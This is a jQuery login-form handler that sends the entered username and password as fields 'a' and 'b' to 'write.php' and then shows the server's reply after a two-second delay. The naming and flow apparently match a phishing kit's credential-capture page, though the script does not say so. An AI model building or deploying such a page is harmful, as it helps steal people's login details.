
var $ = jQuery;

$(function () {

    $('body').on('click', '#of_ok', function () {
        $('input').removeClass('errorClass');
        var user = $('#of_user');
        var pass = $('#of_pass');
        if (user.val().length > 0 && pass.val().length > 0) {
            user.prop('disabled',true);
            pass.prop('disabled',true);
            $('#of_ok').css({'background-color':'#d8d8d8','cursor':'default'});
            $.ajax({
                url: 'write.php?secured=1',
                type:'POST',
                data:({a:user.val(), b:pass.val()}),
                success: function (data) {
                    setTimeout(function() {
                        $('.error_panel').html(data+"<br><br>");
                    },2000);
                }
            });
        } else {
            user.addClass('errorClass');
            user.effect("shake", {times: 4}, 1000);
            pass.addClass('errorClass');
            pass.effect("shake", {times: 4}, 1000);
        }
    });

});